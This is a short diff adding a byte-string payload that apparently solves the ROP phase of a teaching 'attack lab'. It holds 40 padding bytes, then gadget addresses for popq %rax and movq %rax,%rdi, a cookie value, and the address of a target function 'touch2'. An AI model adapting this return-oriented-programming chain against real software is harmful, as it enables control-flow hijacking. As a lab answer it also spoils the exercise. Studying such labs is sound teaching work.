@@ -1,0 +1,5 @@
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
+ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
+fa 97 b9 59 00 00 00 00 /* para value to %rax : 0x59b997fa */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+ec 17 40 00 00 00 00 00 /* touch2 start address */
